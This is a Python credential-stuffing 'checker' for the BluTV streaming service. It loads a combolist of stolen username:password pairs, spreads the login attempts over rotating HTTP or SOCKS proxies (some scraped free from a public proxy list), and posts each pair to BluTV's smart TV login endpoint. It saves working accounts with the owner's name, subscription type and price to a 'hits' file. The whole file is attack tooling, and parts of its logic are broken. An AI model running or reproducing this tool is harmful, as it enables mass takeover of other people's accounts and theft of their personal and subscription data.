try:
    import os, requests, colorama, threading, time, urllib, tkinter
except ImportError:
    input("Error while importing modules. Please install the modules in requirements.txt")
    exit()

colorama.init(convert=True)    

lock = threading.Lock()
counter = 0
costumcounter = 0
failcounter = 0
errorcounter = 0
proxyfilelines = 0
proxies = []
proxy_counter = 0
combolist = []
combolist_counter = 0
modulename = "Blutv Smart API"
moduleowner = "Curve"


class examplemodule:
    def __init__(self, combolist = None, proxytype = None,  proxy = None):
        self.proxy = proxy
        self.proxytype = proxytype
        self.combolist = combolist
        self.username, self.password = self.combolist.split(":")
                
    def checker(self): # your loop function
        proxies = None
        if self.proxy != None:
            if self.proxytype == 1:
                proxies = {"http": f"http://{self.proxy}","https": f"http://{self.proxy}"}
            if self.proxytype == 2:
                proxies = {"http": f"socks4://{self.proxy}","https": f"socks4://{self.proxy}"}
            if self.proxytype == 3:
                proxies = {"http": f"socks5://{self.proxy}","https": f"socks5://{self.proxy}"}
        headers = {
        "deviceid": "Windows:Chrome:94.0.4606.71",
        "deviceresolution": "1366x768",
        "origin": "https://www.blutv.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"

        }        
        try:
            r = requests.post("https://smarttv.blutv.com.tr/actions/account/login", headers = headers, data = "username={}&password={}&platform=com.blu.smarttv".format(self.username, self.password), proxies = proxies)
            script_dir = os.path.dirname(__file__) #<-- absolute dir the script is in
            rel_path = "../../../EXPORTS/blutvsmart.txt"
            dir = os.path.join(script_dir, rel_path)              
            if 'status":"error' in r.text:
                return False, self.combolist, None
            if 'status":"ok' in r.text:                
                with open(dir, "a") as f:
                    f.write(self.combolist + "\n> Type: Hit" + "\n> Name: "+ r.json()['FirstName'] + " " + r.json()['LastName'] + "\n> Subscription Type" + r.text.split(' TL \/ ')[1].split('"')[0] + "\n> Price: " + r.text.split('Price":"')[1].split(' TL')[0] + " ₺\n")                 
                return True, self.combolist, "Hit"
            if 'AccountState":"None' or 'AccountState":"Suspend' or 'AccountState":"Canceled' or 'AccountState":"Expire' in r.text:
                with open(dir, "a") as f:
                    f.write(self.combolist + "\n> Type: Costum\n")                 
                return True, self.combolist, "Costum"
        except:
            return None, "while retries", None            
    
os.system(f"title {modulename} by {moduleowner}")   

threads = int(input(f"\n[{modulename}] Threads > "))
print("\n[1] Proxies\n[2] Get Free Proxies(Maybe you get bad proxies)\n[3] Proxyless")
proxyinput = int(input(f"\n[{modulename}] Select Preference > "))

if proxyinput == 1:
    print("\n[1] Http\n[2] Socks4\n[3] Socks5")
    proxytype = int(input(f"\n[{modulename}] Select Proxy Type > "))
if proxyinput == 2:
    print("\n[1] Http\n[2] Socks4\n[3] Socks5")
    proxytype = int(input(f"\n[{modulename}] Select Proxy Type > "))    
os.system("cls")

script_dir = os.path.dirname(__file__) #<-- absolute dir the script is in
rel_path = "../../../proxies.txt"
proxiesdir = os.path.join(script_dir, rel_path)
           
def load_proxies():
        global proxyfilelines
        if not os.path.exists(proxiesdir):
            print(colorama.Fore.YELLOW + "\nFile proxies.txt not found")
            time.sleep(5)
            os._exit(0)
        with open(proxiesdir, "r", encoding = "UTF-8") as f:
            for line in f.readlines():
                line = line.replace("\n", "")
                proxyfilelines = len(proxies)
                proxyfilelines += 1
                proxies.append(line)            
            if not len(proxies):
                print(colorama.Fore.YELLOW + "\nNo proxies loaded in proxies.txt")
                time.sleep(5)
                os._exit(0)

def load_combo():
    import tkinter as tk
    from tkinter import filedialog

    root = tk.Tk()
    root.withdraw()
    combolistpath = filedialog.askopenfilename(filetypes=[('.txtfiles','.txt')],title='Select Combolist')
    
    if not os.path.exists(combolistpath):
        print(colorama.Fore.YELLOW + "\nFile not found")
        time.sleep(5)
        os._exit(0)
    with open(combolistpath, "r", encoding = "ISO-8859-1") as f:
        for line in f.readlines():
            line = line.replace("\n", "")
            combolist.append(line)            
        if not len(combolist):
                print(colorama.Fore.YELLOW + "\nNo combo loaded in your combolist file")
                time.sleep(5)
                os._exit(0)

  

def getfreeproxy():
    if proxytype == 1:
       # HTTP Proxies
       urllib.request.urlretrieve("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", proxiesdir)
    if proxytype == 2:
       # Socks4 Proxies
       urllib.request.urlretrieve("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all", proxiesdir)
    if proxytype == 3:           
       # Socks5 Proxies
       urllib.request.urlretrieve("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all", proxiesdir)

if proxyinput == 2:
        getfreeproxy()
        time.sleep(1)
        load_proxies()
elif proxyinput == 1:
        load_proxies()
else:
    load_combo()

def safe_print(arg):
        lock.acquire()
        print(arg)
        lock.release()

def count():
        os.system(f'title [{modulename} by {moduleowner}] Hit = {counter} / Costum = {costumcounter} / Fail = {failcounter} / Error = {errorcounter} / Proxy = {proxyfilelines}')

def thread_starter():
        global counter, errorcounter, costumcounter, failcounter
        if proxyinput == 1:
            obj = examplemodule(proxytype, proxies[proxy_counter])
        if proxyinput == 2:
            obj = examplemodule(proxytype, proxies[proxy_counter])
        else:
            obj = examplemodule(combolist[combolist_counter])
        result, message, status = obj.checker()
        if result == True:        
            if status == "Hit":
                counter += 1
                safe_print(colorama.Fore.MAGENTA + f"[{modulename}] " + colorama.Fore.GREEN + "HIT " + colorama.Fore.RESET + message + colorama.Fore.RESET)
                count()
            elif status == "Costum":
                costumcounter += 1
                safe_print(colorama.Fore.MAGENTA + f"[{modulename}] " + colorama.Fore.YELLOW + "Costum " + colorama.Fore.RESET + message + colorama.Fore.RESET)
                count()
        elif result == False:
                failcounter += 1
                safe_print(colorama.Fore.MAGENTA + f"[{modulename}] " + colorama.Fore.RED + "Fail " + colorama.Fore.RESET + message + colorama.Fore.RESET)
                count()
        else:
            errorcounter += 1
            safe_print(colorama.Fore.MAGENTA + f"[{modulename}] " + colorama.Fore.RED + f"Error {message}" + colorama.Fore.RESET)
            count()
            
while True:
        if threading.active_count() <= threads:
            try:
                threading.Thread(target = thread_starter).start()
                proxy_counter += 1
                combolist_counter += 1
            except:
                pass
            if len(proxies) <= proxy_counter: #Loops through proxy file
                proxy_counter = 0
            if len(combolist) <= combolist_counter:
                combolist_counter = 0